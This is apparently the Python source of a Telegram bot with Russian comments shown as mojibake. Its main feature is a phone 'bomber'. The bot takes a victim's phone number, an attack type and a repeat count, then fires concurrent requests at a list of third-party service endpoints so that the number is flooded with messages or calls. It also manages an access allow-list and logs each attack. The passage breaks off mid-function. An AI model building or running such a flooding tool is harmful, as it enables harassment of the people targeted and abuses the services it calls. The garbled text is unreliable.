import asyncio
import aiohttp

from datetime import datetime
from aiohttp import ClientSession
from aiogram import F, Router, types, Bot
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from app.attack.services import urls
from app.attack.feedback_services import feedback_urls
from .texts import text

import app.keyboards as kb  # –ü–æ–¥–∫–ª—é—á–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã

import sys
import os
import json
import logging


# –î–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç—å –∫ –∫–æ—Ä–Ω–µ–≤–æ–π –ø–∞–ø–∫–µ –ø—Ä–æ–µ–∫—Ç–∞, –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from config import allowed_user_id


router = Router()


### –°–∏—Å—Ç–µ–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏  ###

# –°–æ—Å—Ç–æ—è–Ω–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∏ —É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
class AdminStates(StatesGroup):
    add = State()
    remove = State()


# üìÇ –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏
USERS_FILE = "users.json"

# üîÑ –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
def load_users():
    if not os.path.exists(USERS_FILE):  
        return {"allowed_users": []}  # –ï—Å–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

# üíæ –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4, ensure_ascii=False)



# ‚ûï –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@router.callback_query(F.data == "add_user")
async def add_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("‚úç *–û—Ç–ø—Ä–∞–≤—å—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å:*", 
                                     reply_markup=kb.cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.add)

@router.message(AdminStates.add)
async def process_add_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π (–∏–∑–±–µ–≥–∞–µ–º –ø—Ä–æ–±–ª–µ–º)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –¥–æ–±–∞–≤–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])

# ‚ûñ –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@router.callback_query(F.data == "remove_user")
async def remove_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("‚úç *–û—Ç–ø—Ä–∞–≤—å—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å:*", 
                                     reply_markup=kb.cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.remove)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ

@router.message(AdminStates.remove)
async def process_remove_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–¥–∞–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])


# ‚ùå –û—Ç–º–µ–Ω–∞ –¥–µ–π—Å—Ç–≤–∏—è (–∏–∑–º–µ–Ω—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ)
@router.callback_query(F.data == "cancel_action")
async def cancel_action(callback: CallbackQuery, state: FSMContext):
    """–û—Ç–º–µ–Ω—è–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –¥–æ–±–∞–≤–ª–µ–Ω–∏—è/—É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    await state.clear()
    await callback.message.edit_text("–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ ‚úî", reply_markup=kb.admin_keyboard())
    await callback.answer()


# üì• –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
async def process_add_user(message: types.Message):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π (–∏–∑–±–µ–≥–∞–µ–º –ø—Ä–æ–±–ª–µ–º)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –¥–æ–±–∞–≤–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])

# üóë –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
async def process_remove_user(message: types.Message):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–¥–∞–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])


# ‚ùó –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —é–∑–µ—Ä–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –≤ —Å–ø–∏—Å–∫–µ

def is_user_allowed(user_id: int) -> bool:
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –µ—Å—Ç—å –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —Å–ø–∏—Å–∫–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö."""
    if not os.path.exists(USERS_FILE):  # –ï—Å–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫
        return False
    
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        users = json.load(file)

    return user_id in users.get("allowed_users", [])  # –ü—Ä–∏–≤–æ–¥–∏–º –∫ —Å—Ç—Ä–æ–∫–µ


# –§—É–Ω–∫—Ü–∏–∏ –∑–∞–≥—Ä—É–∑–∫–∏ –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è JSON —Å ID —á–∞—Ç–æ–≤
def load_users_pend():
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ ID —á–∞—Ç–æ–≤, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—è –æ—à–∏–±–∫–∏ —Å –ø—É—Å—Ç—ã–º –∏–ª–∏ –ø–æ–≤—Ä–µ–∂–¥–µ–Ω–Ω—ã–º —Ñ–∞–π–ª–æ–º."""
    if not os.path.exists(USERS_FILE) or os.stat(USERS_FILE).st_size == 0:
        return {
            "allowed_users": [],
            "pending_users": {},
            "admin_chat_id": -1002364159616,  # –ó–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
            "output_chat_id": -4648248130     # –ó–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        }
    
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)

            # –ï—Å–ª–∏ admin_chat_id –∏–ª–∏ output_chat_id –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç, –¥–æ–±–∞–≤–ª—è–µ–º –∏—Ö —Å–æ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
            data.setdefault("admin_chat_id", -1002364159616)
            data.setdefault("output_chat_id", -4648248130)

            return data
    except json.JSONDecodeError:
        return {
            "allowed_users": [],
            "pending_users": {},
            "admin_chat_id": -1002364159616,
            "output_chat_id": -4648248130
        }

def save_users_pend(users):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ ID —á–∞—Ç–æ–≤ –≤ —Ñ–∞–π–ª."""
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(users, file, indent=4, ensure_ascii=False)




# –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
settings = load_users_pend()

# –¢–µ–ø–µ—Ä—å ID —á–∞—Ç–æ–≤ –±–µ—Ä—É—Ç—Å—è –∏–∑ —Ñ–∞–π–ª–∞, –∞ –Ω–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –∂–µ—Å—Ç–∫–æ
ADMIN_CHAT_ID = settings["admin_chat_id"]
OUTPUT_CHAT_ID = settings["output_chat_id"]




async def notify_admin_about_request(bot, user_id: int, username: str):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∑–∞–ø—Ä–æ—Å –∞–¥–º–∏–Ω—É –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ pending_users"""
    users = load_users_pend()
      # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Å–ø–∏—Å–æ–∫ "pending_users", –∏ –µ—Å–ª–∏ –Ω–µ—Ç ‚Äî —Å–æ–∑–¥–∞—ë–º
    if "pending_users" not in users:
        users["pending_users"] = {}
    users["pending_users"][str(user_id)] = username or "–ë–µ–∑ username"
    save_users_pend(users)

    invite_request = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="‚úÖ –†–∞–∑—Ä–µ—à–∏—Ç—å", callback_data=f"approve_{user_id}")],
            [InlineKeyboardButton(text="‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data=f"deny_{user_id}")]
        ]
    )
    text = f"üö® *–ü–æ–ø—ã—Ç–∫–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–æ—Ç–∞!*\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username if username else '–ë–µ–∑ username'}\nüÜî ID: `{user_id}`"
    await bot.send_message(ADMIN_CHAT_ID, text, reply_markup=invite_request)

@router.callback_query(F.data.startswith("approve_"))
async def approve_user(callback):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –æ–¥–æ–±—Ä–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    user_id = int(callback.data.split("_")[1])

    users = load_users_pend()
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Å–ø–∏—Å–æ–∫ "pending_users", –∏ –µ—Å–ª–∏ –Ω–µ—Ç ‚Äî —Å–æ–∑–¥–∞—ë–º
    if "pending_users" not in users:
        users["pending_users"] = {}
    
    if str(user_id) in users["pending_users"]:
        username = users["pending_users"].pop(str(user_id))  # –£–¥–∞–ª—è–µ–º –∏–∑ pending_users
        users["allowed_users"].append(user_id)  # –î–æ–±–∞–≤–ª—è–µ–º –≤ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã–µ
        save_users_pend(users)

        message_text = f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} –≤—ã–¥–∞–ª–∏ –¥–æ—Å—Ç—É–ø!" if username != "–ë–µ–∑ username" else f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –≤—ã–¥–∞–ª–∏ –¥–æ—Å—Ç—É–ø! (ID: `{user_id}`)"
        log_text = f"‚úÖ –í—ã –≤—ã–¥–∞–ª–∏ –¥–æ—Å—Ç—É–ø, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} ID: {user_id}!" if username != "–ë–µ–∑ username" else f"‚úÖ –í—ã –≤—ã–¥–∞–ª–∏ –¥–æ—Å—Ç—É–ø!  (ID: `{user_id}`)"
        
        await callback.bot.send_message(OUTPUT_CHAT_ID, message_text)
        await callback.bot.send_message(ADMIN_CHAT_ID, log_text)


    await callback.message.delete()

@router.callback_query(F.data.startswith("deny_"))
async def deny_user(callback):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –æ—Ç–∫–∞–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    user_id = int(callback.data.split("_")[1])

    users = load_users_pend()

    if str(user_id) in users["pending_users"]:
        username = users["pending_users"].pop(str(user_id))  # –ü–æ–ª—É—á–∞–µ–º username –ø–µ—Ä–µ–¥ —É–¥–∞–ª–µ–Ω–∏–µ–º
        save_users_pend(users)

        message_text = f"‚ùéÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –¥–æ—Å—Ç—É–ø–µ !" if username != "–ë–µ–∑ username" else f"‚ùéÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –¥–æ—Å—Ç—É–ø–µ ! (ID: `{user_id}`)"
        log_text = f"‚ùéÔ∏è –í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –¥–æ—Å—Ç—É–ø–µ, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} ID: {user_id}!" if username != "–ë–µ–∑ username" else f"‚ùéÔ∏è –í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –¥–æ—Å—Ç—É–ø–µ (ID: `{user_id}`)"

        await callback.bot.send_message(OUTPUT_CHAT_ID, message_text)
        await callback.bot.send_message(ADMIN_CHAT_ID, log_text)

    await callback.message.delete()


@router.callback_query(lambda c: c.data.startswith("status_"))
async def update_status(callback: types.CallbackQuery):
    status_messages = {
    "status_green": "üü¢ <b>–°—Ç–∞—Ç—É—Å: –†–∞–±–æ—Ç–∞–µ—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ</b>\n\n‚úÖ –ë–æ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∏—Ä—É–µ—Ç –±–µ–∑ –æ—à–∏–±–æ–∫!",
    "status_yellow": "üü° <b>–°—Ç–∞—Ç—É—Å: –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã</b>\n\n‚ö† –í–æ–∑–º–æ–∂–Ω—ã –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –Ω–µ–ø–æ–ª–∞–¥–∫–∏.",
    "status_red": "üî¥ <b>–°—Ç–∞—Ç—É—Å: –ë–æ—Ç –æ—Ñ—Ñ–ª–∞–π–Ω</b>\n\n‚ùå –í—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ."
}

    
    status_text = status_messages.get(callback.data, "‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Å—Ç–∞—Ç—É—Å")
    users = load_users()
    message_id = users.get("status_message_id")
    if callback.from_user.id in allowed_user_id:
        if message_id:
            try:
                await callback.bot.edit_message_text(chat_id=OUTPUT_CHAT_ID, message_id=message_id, text=status_text, parse_mode="HTML")
            except:
                new_message = await callback.bot.send_message(OUTPUT_CHAT_ID, status_text, parse_mode="HTML")
                users["status_message_id"] = new_message.message_id
                save_users(users)
        else:
            new_message = await callback.bot.send_message(OUTPUT_CHAT_ID, status_text, parse_mode="HTML")
            users["status_message_id"] = new_message.message_id
            save_users(users)
        
        await callback.answer("–°—Ç–∞—Ç—É—Å –æ–±–Ω–æ–≤–ª—ë–Ω!")
    else:
        await callback.message.answer(text['norights'])


### –õ–æ–≥–≥–µ—Ä ###

SETTINGS_FILE = "settings.json"


def load_settings():
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏–∑ —Ñ–∞–π–ª–∞."""
    if not os.path.exists(SETTINGS_FILE):
        return {"logging_enabled": True}  # –ó–Ω–∞—á–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é

    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return {"logging_enabled": True}  # –ï—Å–ª–∏ —Ñ–∞–π–ª –ø–æ–≤—Ä–µ–∂–¥—ë–Ω, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –¥–µ—Ñ–æ–ª—Ç


def save_settings(settings):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –≤ —Ñ–∞–π–ª."""
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, indent=4, ensure_ascii=False)


LOG_FILE = "logs.txt"
logging_enabled = True  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é –ª–æ–≥–∏ –≤–∫–ª—é—á–µ–Ω—ã


# –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º print() –∏ –∑–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ —Ñ–∞–π–ª
class PrintLogger:
    def write(self, message):
        if logging_enabled and message.strip():  # –ù–µ –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏
            log_entry = f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")} : {message.strip()}\n'
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        sys.__stdout__.write(message)  # –î—É–±–ª–∏—Ä—É–µ–º –≤ –∫–æ–Ω—Å–æ–ª—å

    def flush(self):  # –ù—É–∂–Ω–æ –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏ —Å sys.stdout
        pass


sys.stdout = PrintLogger()  # –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –≤—ã–≤–æ–¥


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è/–≤—ã–∫–ª—é—á–µ–Ω–∏—è –ª–æ–≥–æ–≤
@router.message(Command("logs"))
async def toggle_logs(message: types.Message):
    global logging_enabled
    if message.from_user.id in allowed_user_id:  # –£–∫–∞–∂–∏—Ç–µ —Å–≤–æ–π ID
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚úÖ –í–∫–ª—é—á–∏—Ç—å", callback_data="enable_logs"),
             InlineKeyboardButton(text="‚ùå –û—Ç–∫–ª—é—á–∏—Ç—å", callback_data="disable_logs")]
        ])
        await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è:", reply_markup=keyboard)
    else:
        await message.answer(text['norights'])


@router.callback_query(F.data.in_(["enable_logs", "disable_logs"]))
async def set_logging(callback: types.CallbackQuery):
    global logging_enabled

    if callback.data == "enable_logs":
        logging_enabled = True
        await callback.message.edit_text("‚úÖ –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ!")
    else:
        logging_enabled = False
        await callback.message.edit_text("‚ùå –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Ç–∫–ª—é—á–µ–Ω–æ!")

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫—É
    save_settings({"logging_enabled": logging_enabled})


# –û—Ç–∫–ª—é—á–∞–µ–º –¥–æ—Ç–æ—à–Ω—ã–µ –ª–æ–≥–∏ aiogram
logging.getLogger("aiogram").setLevel(logging.WARNING)


#### –ö–ª–∞—Å—Å—ã ####

class BomberState(StatesGroup):
    waiting_number = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    waiting_attack_type = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–±–æ—Ä–∞ —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏
    waiting_replay = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π
    bombing = State()  # –ê—Ç–∞–∫–∞


#### –§—É–Ω–∫—Ü–∏–∏ –±–æ–º–±–µ—Ä–∞ ####

success_count = 0
stop_events = {}  # –ì–ª–æ–±–∞–ª—å–Ω—ã–π —Å–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è stop_event –ø–æ user_id
manual_stop_flags = {}  # –ì–ª–æ–±–∞–ª—å–Ω—ã–π —Å–ª–æ–≤–∞—Ä—å –¥–ª—è —Ñ–ª–∞–≥–æ–≤ —Ä—É—á–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏

async def request(session, url, attack_type, state, stop_event):
    """
    –í—ã–ø–æ–ª–Ω—è–µ—Ç HTTP-–∑–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–∏—Å—É.
    –ï—Å–ª–∏ stop_event —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –∑–∞–ø—Ä–æ—Å –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è.
    –ü—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –∑–∞–ø—Ä–æ—Å–µ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç —Å—á—ë—Ç—á–∏–∫ —É—Å–ø–µ—à–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏.
    """
    if stop_event.is_set():
        return

    try:
        if url['info']['attack'] in attack_type:
            async with session.request(
                url['method'], url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20,
                ssl=False
            ) as response:
                if 200 <= response.status < 300:
                    data = await state.get_data()
                    success_count = data.get("success_count", 0) + 1
                    await state.update_data(success_count=success_count)
    except Exception as e:
        pass
#        print(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ ({url['url']}): {e}")

async def async_attacks(user_id, username, number, attack_type, replay, stop_event, state):
    """
    –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –∞—Ç–∞–∫–∏.
    –ï—Å–ª–∏ stop_event —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –Ω–µ–∑–∞–≤–µ—Ä—à—ë–Ω–Ω—ã–µ –∑–∞–¥–∞—á–∏ –æ—Ç–º–µ–Ω—è—é—Ç—Å—è,
    –∞ –ª–æ–≥ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤—ã–≤–æ–¥–∏—Ç—Å—è —Å —É–∫–∞–∑–∞–Ω–∏–µ–º username, id, –Ω–æ–º–µ—Ä–∞ –∏ —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏.
    """
    async with ClientSession() as session:
        for i in range(int(replay)):
            if stop_event.is_set():
                print(f"üõë –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: @{username} (ID: {user_id}) | –ù–æ–º–µ—Ä: {number} | –¢–∏–ø: {attack_type}")
                del stop_events[user_id]
                return

            services = urls(number) + feedback_urls(number)

            # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞
            tasks = [
                asyncio.create_task(request(session, service, attack_type, state, stop_event))
                for service in services
            ]

            # –ñ–¥–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–¥–∞—á —Å –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π stop_event
            while tasks:
                done, pending = await asyncio.wait(tasks, timeout=0.1)
                if stop_event.is_set():
                    for task in pending:
                        task.cancel()
                    break
                tasks = list(pending)

            if stop_event.is_set():
                print(f"üõë –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: @{username} (ID: {user_id}) | –ù–æ–º–µ—Ä: {number} | –¢–∏–ø: {attack_type}")
                del stop_events[user_id]
                return

            data = await state.get_data()
            success_count = data.get("success_count", 0)
            print(f"‚úÖ [{i + 1}/{replay}] –£—Å–ø–µ—à–Ω—ã—Ö –∞—Ç–∞–∫: {success_count} | @{username} (ID: {user_id}) | –ù–æ–º–µ—Ä: {number} | –¢–∏–ø: {attack_type}")
            await asyncio.sleep(0.5)

    print(f"üõë –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞: @{username} (ID: {user_id}) | –ù–æ–º–µ—Ä: {number} | –¢–∏–ø: {attack_type}")
    del stop_events[user_id]

async def start_async_attacks(user_id, username, number, attack_type, replay, state):
    """
    –ó–∞–ø—É—Å–∫–∞–µ—Ç –∞—Ç–∞–∫—É: —Å–æ–∑–¥–∞–µ—Ç—Å—è stop_event, —Å–±—Ä–∞—Å—ã–≤–∞–µ—Ç—Å—è —Å—á—ë—Ç—á–∏–∫,
    –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –∞—Ç–∞–∫.
    """
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
